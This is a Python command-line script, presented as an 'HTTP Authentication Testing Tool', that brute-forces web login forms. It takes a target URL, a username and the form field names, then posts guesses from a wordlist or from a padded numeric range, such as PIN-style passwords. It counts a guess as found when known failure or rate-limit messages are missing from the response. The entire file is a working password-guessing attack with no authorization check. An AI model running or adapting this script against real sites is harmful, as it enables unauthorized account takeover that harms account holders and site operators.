import requests
from time import sleep
from rich.console import Console
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TaskProgressColumn,
    TimeElapsedColumn
)
from rich.panel import Panel
console = Console()


def http_login_brute_force():

    console.print(
        Panel.fit(
            "[bold cyan]LET[/bold cyan]\n"
            "[dim]HTTP Authentication Testing Tool[/dim]",
            border_style="cyan"
        )
    )

    # Kullanıcıdan gerekli bilgileri alıyoruz.
    target_url = input("Target URL: ")
    range_value = int(
        input("How many passwords would you like to try: ")
    )
    zfill = int(
        input("Password digit count: ")
    )
    target_username = input("Target Username: ")
    username_parser = input("Username input parser: ")
    password_parser = input("Password input parser: ")
    wordlist = input("Wordlist path (optional): ")

    try:
        response = requests.get(
            target_url,
            timeout=10
        )

        if response.status_code == 200:

            console.print(
                Panel(
                    "[bold green]Connection Successful[/bold green]\n"
                    "[dim]HTTP Status: 200[/dim]",
                    title="LET",
                    border_style="green"
                )
            )

            sleep(1)

        else:

            console.print(
                Panel(
                    "[bold red]Connection Failed[/bold red]\n"
                    f"[dim]HTTP Status: {response.status_code}[/dim]",
                    title="LET",
                    border_style="red"
                )
            )

            return

    except requests.RequestException as error:

        console.print(
            Panel(
                f"[bold red]Connection Error[/bold red]\n{error}",
                title="LET",
                border_style="red"
            )
        )

        return

    # Wordlist verilmişse dosyadan, verilmemişse sayı aralığından
    # parola listesi oluşturulur.
    if wordlist:

        try:
            with open(
                wordlist,
                "r",
                encoding="utf-8",
                errors="ignore"
            ) as file:

                password_list = [
                    line.strip()
                    for line in file
                    if line.strip()
                ]

        except FileNotFoundError:

            console.print(
                Panel(
                    f"[bold red]Wordlist not found:[/bold red]\n"
                    f"{wordlist}",
                    title="ERROR",
                    border_style="red"
                )
            )

            return

    else:

        password_list = [
            str(i).zfill(zfill)
            for i in range(range_value)
        ]

    console.print(
        Panel(
            f"[bold cyan]Target:[/bold cyan] {target_url}\n"
            f"[bold cyan]Username:[/bold cyan] {target_username}\n"
            f"[bold cyan]Attempts:[/bold cyan] {len(password_list)}",
            title="Attack Configuration",
            border_style="cyan"
        )
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TextColumn(
            "[yellow]Current: {task.fields[current]}"
        ),
        TimeElapsedColumn(),
        console=console
    ) as progress:

        task = progress.add_task(
            "Testing passwords",
            total=len(password_list),
            current="----"
        )

        for password in password_list:

            progress.update(
                task,
                current=password
            )

            data = {
                username_parser: target_username,
                password_parser: password
            }

            try:

                response = requests.post(
                    target_url,
                    data=data,
                    timeout=10
                )

                if (
                    "Invalid" not in response.text
                    and "Too many attempts" not in response.text
                    and "The email address or password is incorrect"
                    not in response.text
                ):

                    progress.update(
                        task,
                        description="[bold green]Password Found[/bold green]"
                    )

                    console.print(
                        Panel(
                            f"[bold green]Possible Password:[/bold green] "
                            f"[white]{password}[/white]",
                            title="SUCCESS",
                            border_style="green"
                        )
                    )

                    break

            except requests.RequestException as error:

                progress.update(
                    task,
                    description="[bold red]Request Error[/bold red]"
                )

                console.print(
                    Panel(
                        str(error),
                        title="ERROR",
                        border_style="red"
                    )
                )

                break

            progress.advance(task)
